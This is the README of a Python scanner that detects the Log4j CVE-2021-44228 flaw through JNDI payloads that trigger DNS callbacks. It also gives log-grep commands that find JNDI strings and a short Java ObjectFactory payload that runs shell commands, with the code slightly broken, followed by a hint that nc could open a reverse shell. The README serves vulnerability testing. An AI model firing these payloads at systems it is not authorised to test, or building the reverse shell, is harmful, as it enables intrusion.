# log4j-detect

<h4 align="center">Simple Python 3 script to detect the "Log4j" Java library vulnerability (CVE-2021-44228) for a list of URL with multithreading</h4>

This script is based from takito1812/log4j-detect

By [ExodataCyberdefense](https://exodata.fr)

---

The script "log4j-detect.py" developed in Python 3 is responsible for detecting whether a list of URLs are vulnerable to CVE-2021-44228.

To do so, it sends a GET request using threads (higher performance) to each of the URLs in the specified list. The GET request contains a payload that on success returns a DNS request to Burp Collaborator / interactsh. This payload is sent in a test parameter and in the "User-Agent" / "Referer" / "X-Forwarded-For" / "Authentication" headers.
Finally, if a host is vulnerable, an identification number will appear in the subdomain prefix of the Burp Collaborator / interactsh payload and in the output of the script, allowing to know which host has responded via DNS.

It should be noted that this script only handles DNS detection of the vulnerability and does not test remote command execution.

### Running log4j-detect.py

```sh
python3 log4j-detect.py -s <burpCollaborator/interactsh...> [-u [urls]] [-f [urlFileList]] [-t THREADS] [-p PROXY] [--urllib3-warnings|--no-urllib3-warnings]
```

![imagen](https://user-images.githubusercontent.com/56491288/145856295-f85b06da-17f2-4aa7-85fb-e0b75d6e1965.png)

## If you have direct access to the server you can run:

```sh
sudo egrep -i -r '\$\{jndi:(ldap[s]?|rmi)://[^\n]+' /var/log
sudo find /var/log -name \*.gz -print0 | xargs -0 zgrep -E -i '\$\{jndi:(ldap[
s]?|rmi)://[^\n]+'

```
To check if someone tried to do a connexion through an ldap server

## If the script detects a vulnerabilty

Here is a sample of code that you can launch to test if your server can be pwned (If it's a windows shell you can just use poweshell syntax)

```java
public class ExportObject implements javax.naming.spi.ObjectFactory {
	public ExportObject() {
		try {
			java.lang.getRuntime().exec("touch ~/pwned");
			java.lang.getRuntime().exec("ls ~");
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
```

Something like could let you make reverse shell with the `nc` command
